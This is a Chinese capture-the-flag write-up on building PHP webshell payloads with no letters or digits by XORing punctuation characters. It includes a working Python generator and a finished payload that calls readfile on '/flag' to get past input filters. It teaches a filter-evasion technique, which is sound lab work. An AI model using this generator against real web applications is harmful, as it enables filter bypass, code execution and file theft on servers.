# 内网渗透与高级社工-免杀payload制作-G2 WriteUp

本题考查无字母数字WebShell，可阅读[https://zhuanlan.zhihu.com/p/585350887](https://zhuanlan.zhihu.com/p/585350887)

PHP中两个字符串异或之后的结果还是字符串，可以通过允许输入的非字母数字 ASCII 字符间异或`^`获得字母，通过连接符`.`连接起来，最终形成一个命令字符串。

例如，`(')'^'[')`的结果是`r`，`('%'^'@')`的结果是`e`，依次类推，最终拼接成`readfile`。

PHP的变量名可以不含字母数字，`$_`是一个合法的变量名，因此可以通过`$_=(func); $_(arg);`的形式来调用函数。

生成payload的python代码示例如下：

```python
def char_to_xor(target_char):
    # 允许使用的非字母数字 ASCII 字符集
    non_alnum = "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ "
    
    for c1 in non_alnum:
        for c2 in non_alnum:
            if chr(ord(c1) ^ ord(c2)) == target_char:
                # 对单引号和反斜杠进行转义以符合 PHP 语法
                c1_esc = c1.replace('\\', '\\\\').replace("'", "\\'")
                c2_esc = c2.replace('\\', '\\\\').replace("'", "\\'")
                return f"('{c1_esc}'^'{c2_esc}')"
                
    # 若本身为非字母数字，直接拼接
    target_esc = target_char.replace('\\', '\\\\').replace("'", "\\'")
    return f"'{target_esc}'"

def string_to_non_alnum(s):
    parts = []
    for char in s:
        if char.isalnum():
            # 字母和数字转换为异或拼接形式
            parts.append(char_to_xor(char))
        else:
            # 标点符号直接保留，对单引号和反斜杠进行转义
            char_esc = char.replace('\\', '\\\\').replace("'", "\\'")
            parts.append(f"'{char_esc}'")
    return ".".join(parts)

def generate_php_payload(func, arg):
    obf_func = string_to_non_alnum(func)
    obf_arg = string_to_non_alnum(arg)
    
    # 构造类似于 $_=(func); $_(arg); 的无字母数字 Payload
    return f"$_=({obf_func});$_({obf_arg});"

if __name__ == "__main__":
    function_name = "readfile"
    argument = "/flag"
    
    payload = generate_php_payload(function_name, argument)
    print(payload)
```

获得`readfile('/flag')`的无字母数字payload为：

```
$_=((')'^'[').('%'^'@').('!'^'@').('$'^'@').('&'^'@').(')'^'@').(','^'@').('%'^'@'));$_('/'.('&'^'@').(','^'@').('!'^'@').('\''^'@'));
```